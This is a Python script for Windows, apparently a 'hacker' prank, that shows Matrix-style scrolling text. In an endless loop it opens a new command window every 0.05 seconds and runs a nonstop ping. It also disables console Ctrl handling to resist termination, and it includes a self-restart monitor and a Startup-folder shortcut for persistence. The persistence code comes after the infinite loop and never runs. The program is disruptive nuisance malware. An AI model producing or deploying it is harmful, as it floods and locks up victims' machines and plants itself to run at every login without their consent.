import os
import subprocess
import random
import time
import psutil
import shutil
import sys
import win32com.client
import ctypes

# Set the initial text color to green
os.system("color a")

# Function to display text in full screen
def display_full_screen_text(text):
    # Create a temporary batch file to display the text
    with open('temp.bat', 'w') as f:
        f.write(f'@echo off\nmode con: cols=120 lines=40\ncls\necho {text}\nexit')

    # Open a new command prompt window and run the temporary batch file
    subprocess.Popen(['start', 'cmd', '/c', 'temp.bat'], shell=True)

# Display the directory tree
subprocess.Popen(["tree"], shell=True)

# Continuously ping Google's website
subprocess.Popen(["ping", "www.google.com", "-t"])

# Matrix-style characters
characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-=_+[]{}|;':\",.<>/?`~"
scroll_width = 80

# Generate random colors
colors = ["a", "b", "c", "d", "e", "f"]
random_color = lambda: random.choice(colors)

# Display the hacker-like code animation
while True:
    code = "".join(random.choice(characters) for _ in range(scroll_width))
    os.system("cls")
    display_full_screen_text(random_color() + code)
    time.sleep(0.05)

    # Prevent program termination using ctypes
    kernel32 = ctypes.WinDLL('kernel32')
    kernel32.SetConsoleCtrlHandler(None, 1)

# Monitoring process to restart the script if terminated
def monitor_process():
    current_process = psutil.Process()
    parent_process = current_process.parent()

    while True:
        if not current_process.is_running():
            subprocess.Popen(['python', __file__], creationflags=subprocess.CREATE_NEW_CONSOLE)
            break

        if not parent_process.is_running():
            break

        time.sleep(1)

# Start the monitoring process
monitor_process()

# Create a shortcut to the Python script in the Windows startup folder
startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
shortcut_path = os.path.join(startup_folder, "HackerScript.lnk")
current_script = sys.argv[0]
if not os.path.exists(shortcut_path):
    try:
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = current_script
        shortcut.WorkingDirectory = os.path.dirname(current_script)
        shortcut.IconLocation = current_script
        shortcut.save()
    except:
        pass
